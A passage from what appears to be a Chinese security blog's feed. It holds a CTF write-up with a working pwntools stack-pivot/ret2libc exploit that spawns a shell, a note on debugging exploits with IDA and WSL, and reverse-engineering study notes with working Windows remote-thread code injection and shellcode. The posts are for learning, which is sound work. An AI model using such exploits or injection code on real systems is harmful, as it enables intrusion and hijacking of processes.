alt="image-20250103235925955"></p><p>刚刚说了，rbp是rsp的因子，想要修改rsp必须先修改rbp，然后再leave，因此可以通过先把rbp放到链首然后再leave的方式修改rsp的值</p><p><img src="https://s2.loli.net/2025/01/04/GPSFt8zlbeoc6XV.png" alt="image-20250104002905805"></p><p>执行leave_ret之后</p><p><img src="https://s2.loli.net/2025/01/04/iIyVZDQMsn3vkHp.png" alt="image-20250104003447718"></p><p>leave_ret还有一个ret，可以直接触发rop链</p><p>那么，流程是这样的：</p><p>栈迁移+触发第一次的rop链+栈迁移+触发第二次rop</p><p>注意：在system函数中rsp值会减0x338，要留够空间，实际给了0x800。read函数读取值时参数在栈上，不能被覆盖，所以第一次给值后需要把下次的rbp放到更后面的位置(值更大)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">name = <span class="string">&quot;./stack_pivoting&quot;</span></span><br><span class="line"></span><br><span class="line">new_rbp = <span class="number">0x4040A0</span>+<span class="number">0x800</span> <span class="comment">#分配足够大的空间</span></span><br><span class="line">e = ELF(name)</span><br><span class="line">pPop_rdi = p64(<span class="number">0x4011E3</span>)</span><br><span class="line">pStart = p64(e.symbols[<span class="string">&#x27;_start&#x27;</span>])</span><br><span class="line">pRet = p64(<span class="number">0x4011E4</span>)</span><br><span class="line">pLeave_ret = p64(<span class="number">0x40121F</span>)</span><br><span class="line">pDataBef = p64(new_rbp-<span class="number">0x40</span>)</span><br><span class="line">pData = p64(new_rbp)</span><br><span class="line">pDataNext = p64(new_rbp+<span class="number">0x40</span>)</span><br><span class="line">pReadbuf = p64(<span class="number">0x401203</span>)</span><br><span class="line">pPuts = p64(<span class="number">0x401064</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(name)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Do you know Stack_Pivoting?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#当rbp修改后,使用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop1</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#最前面留rbp返回到开始的那个地址</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pDataBef + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop2</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#最前面留rbp返回到开始的那个地址</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pData + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x40</span>)+pData+pReadbuf</span><br><span class="line">p.send(payload1) <span class="comment">#修改rbp</span></span><br><span class="line"></span><br><span class="line">payload2 = pPop_rdi+p64(libc_start_main_got)+pPuts+pRet+pReadbuf+cyclic(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sendRop1(p,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = pPop_rdi + p64(binsh_addr) +pRet+p64(system_addr)+cyclic(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendRop2(p,payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> pwn </category>
          
          <category> 栈溢出 </category>
          
          <category> ret2libc </category>
          
          <category> 栈迁移 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA-vscode-wsl联合调试pwn题的exp脚本</title>
      <link href="/posts/ac1dbd3e.html"/>
      <url>/posts/ac1dbd3e.html</url>
      
        <content type="html"><![CDATA[<h2 id="起因">起因</h2><p>作为只会用IDA调试的尊(fei)贵(wu)RE手，调pwn的exp用gdb实在用不来QAQ，所以想了个办法</p><h2 id="环境">环境</h2><ul><li>wsl2-Ubuntu</li><li>IDA8.3</li><li>vscode及python插件</li><li>pwn题和对应的exp</li></ul><h2 id="步骤">步骤</h2><p>wsl中在题目目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code .</span><br></pre></td></tr></table></figure><p>如果主机有vscode应该会被唤醒，然后执行wsl的vscode server的安装，安装完后，可以在wsl中使用vscode<br>然后在插件中安装调试python的插件</p><p>将idaserver放入wsl中，启动</p><p>用wsl中的vscode启动调试，断点断在<code>p = process(xxx)</code>之后</p><p>ida附加，在进程列表中找到对应的进程</p><p>然后愉快地开始调试，注意两边要一起调</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 知识集 </category>
          
          <category> 记录 </category>
          
          <category> pwn </category>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 调试 </tag>
            
            <tag> ida </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》09-代码注入</title>
      <link href="/posts/37cfb00c.html"/>
      <url>/posts/37cfb00c.html</url>
      
        <content type="html"><![CDATA[<h2 id="代码注入">代码注入</h2><p>之前学习了DLL注入，实际上让进程执行我们自己的代码还有另一种方式，就是代码注入。<br>顾名思义，将代码注入进程，然后创建远程线程去执行。</p><p>和DLL注入的区别很明显：DLL注入是通过LoadLibrary自动执行DLL内的初始化函数从而实现执行我们的函数，而代码注入则是直接申请空间并写入函数机器码及对应传参，最后用CreateRemoteThread将函数首地址和传参首地址做参数来执行。</p><p>具体流程：</p><ul><li>获取目标进程句柄</li><li>将参数打包为结构体</li><li>将结构体写入目标进程</li><li>将需要执行的函数写入目标进程</li><li>创建远程线程执行</li></ul><blockquote><p>按书上的直接写结果会崩溃，调试了一下发现因为有跳转表之类的东西，所以地址不对应<br>在项目-属性-链接器-增量链接-禁用后<br>项目-属性-C/C+±代码生成-安全检查-禁用<br>项目-属性-C/C+±优化-内联函数扩展-禁用<br>项目-属性-C/C+±常规-支持仅我的代码调试-禁用</p></blockquote><p>以上几个禁用后，可以在debug配置下缩小代码规模和防止出现奇怪地址的跳转</p><p>同时似乎函数位置不一定和写代码的时候的位置一样，所以要看一下</p><p>然后是导入表的问题，如果是直接使用库函数，会直接跳转到导入表条目，所以不能在代码中直接使用库函数，必须取得后传地址过去。</p><h2 id="实践C">实践C</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">DWORD64 pLoadLibraryA;</span><br><span class="line">DWORD64 pGetProcAddress;</span><br><span class="line">DWORD64 pMassage;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">writeMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID pReadyToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPVOID pMassage = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!pMassage)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;申请内存失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> bytewritten;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pMassage, pReadyToWrite, size, &amp;bytewritten);</span><br><span class="line"><span class="keyword">if</span> (bytewritten != size)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;写入字节失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[+] 写入成功&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pMassage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">code</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;SUCCESS&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">targetCode</span><span class="params">(Data* data)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> user32[] = &#123; <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="type">char</span> messageBox[] = &#123; <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">HMODULE hModule = ((<span class="built_in">HMODULE</span>(*)(<span class="type">char</span>*))(data-&gt;pLoadLibraryA))(user32);</span><br><span class="line"><span class="keyword">if</span> (!hModule)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID pMessagebox = ((<span class="built_in">FARPROC</span>(*)(HMODULE, LPCSTR))(data-&gt;pGetProcAddress))(hModule, messageBox);</span><br><span class="line">((<span class="built_in">int</span> (*)(HWND, LPCSTR, LPCSTR, UINT))pMessagebox)(<span class="literal">NULL</span>, (<span class="type">char</span>*)(data-&gt;pMassage), (<span class="type">char</span>*)(data-&gt;pMassage), MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取目标句柄</span></span><br><span class="line"><span class="comment">//申请空间，写入参数</span></span><br><span class="line"><span class="comment">//申请空间写入函数</span></span><br><span class="line"><span class="comment">//远程线程执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectCode</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;SUCCESS&quot;</span>;</span><br><span class="line">LPVOID pMessage = <span class="built_in">writeMemory</span>(hProcess, message, <span class="built_in">sizeof</span>(message) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data.pMassage = (DWORD64)pMessage;</span><br><span class="line">data.pGetProcAddress = (DWORD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">data.pLoadLibraryA = (DWORD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">LPVOID pData = <span class="built_in">writeMemory</span>(hProcess, &amp;data, <span class="built_in">sizeof</span>(data) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> funcSize = (<span class="type">uintptr_t</span>)writeMemory - (<span class="type">uintptr_t</span>)targetCode;</span><br><span class="line"></span><br><span class="line">LPVOID pfunc = <span class="built_in">writeMemory</span>(hProcess, (PVOID)targetCode, funcSize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pfunc, pData, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pid = atol(argv[1]);</span></span><br><span class="line"><span class="built_in">injectCode</span>(pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中targetCode是写入进程的函数，<br>uintptr_t funcSize = (uintptr_t)writeMemory - (uintptr_t)targetCode;的原因是我编译之后看了一下反编译结果，发现是这两个函数挨在一起，那么首地址相减就是大小了。</p><h2 id="实践ASM">实践ASM</h2><p>实际上，一般来说，代码注入都是注入汇编代码，因为汇编代码可以更方便地和寄存器，内存空间进行交互</p><p>如果要直接用汇编来完成操作，步骤为：</p><p>将执行的函数写为shellcode，然后创建远程线程执行，这里可以直接把数据和代码写在一起传递</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">jmp code;</span></span><br><span class="line"><span class="string">user32:</span></span><br><span class="line"><span class="string">.asciz &quot;user32.dll&quot;;</span></span><br><span class="line"><span class="string">messageboxa:</span></span><br><span class="line"><span class="string">.asciz &quot;MessageBoxA&quot;;</span></span><br><span class="line"><span class="string">message:</span></span><br><span class="line"><span class="string">.asciz &quot;SUCCESS&quot;;</span></span><br><span class="line"><span class="string">pLoadLibraryA:</span></span><br><span class="line"><span class="string">.quad 0x00007FFD20BC9460;</span></span><br><span class="line"><span class="string">pGetProcessAddress:</span></span><br><span class="line"><span class="string">.quad 0x00007FFD20BC3C30;</span></span><br><span class="line"><span class="string">code:</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">lea rcx,[rip + rip - user32];</span></span><br><span class="line"><span class="string">mov rax,[rip + rip - pLoadLibraryA];</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">mov rcx,rax;</span></span><br><span class="line"><span class="string">lea rdx,[rip + rip - messageboxa];</span></span><br><span class="line"><span class="string">mov rax,[rip + rip - pGetProcessAddress];</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">lea rbx,[rip + rip - message];</span></span><br><span class="line"><span class="string">mov r9,1;</span></span><br><span class="line"><span class="string">mov r8,rbx;</span></span><br><span class="line"><span class="string">mov rdx,rbx;</span></span><br><span class="line"><span class="string">mov rcx, 0;</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pasm</span>(<span class="params">code_list</span>):</span><br><span class="line">    code_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    code_str += <span class="string">&#x27;__asm&#123;\n&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> code_list:</span><br><span class="line">        code_str += <span class="string">f&quot;_emit 0x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>;\n&quot;</span></span><br><span class="line">    code_str += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(code_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line">outcode,count = ks.asm(code)</span><br><span class="line"></span><br><span class="line">phex(outcode)</span><br><span class="line"><span class="comment"># pasm(outcode)</span></span><br></pre></td></tr></table></figure><p>这段汇编总能出现一些奇怪的bug，要注意栈平衡和调用函数时栈最后一位为0，lea和mov什么时候传值什么时候传地址，以及x64下的基本调用方式。不管我写没写后面的pop，程序都会崩溃不知道为什么，但是messagebox确实弹出了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectCodeAsm</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line">BYTE code[] = &#123; <span class="number">0xeb</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x2e</span>, <span class="number">0x64</span>, <span class="number">0x6c</span>, <span class="number">0x6c</span>, <span class="number">0x00</span>, <span class="number">0x4d</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0x6f</span>, <span class="number">0x78</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x43</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x94</span>, <span class="number">0xbc</span>, <span class="number">0x20</span>, <span class="number">0xfd</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x3c</span>, <span class="number">0xbc</span>, <span class="number">0x20</span>, <span class="number">0xfd</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x0d</span>, <span class="number">0xc8</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x05</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x15</span>, <span class="number">0xc0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x05</span>, <span class="number">0xd5</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x1d</span>, <span class="number">0xbc</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x49</span>, <span class="number">0xc7</span>, <span class="number">0xc1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd8</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0xc3</span> &#125;;</span><br><span class="line">LPVOID pcode = <span class="built_in">writeMemory</span>(hProcess, code, <span class="built_in">sizeof</span>(code));</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//pid = atol(argv[1]);</span></span><br><span class="line"><span class="built_in">injectCodeAsm</span>(pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 代码注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天堂之门研究</title>
      <link href="/posts/4ca4211.html"/>
      <url>/posts/4ca4211.html</url>
      
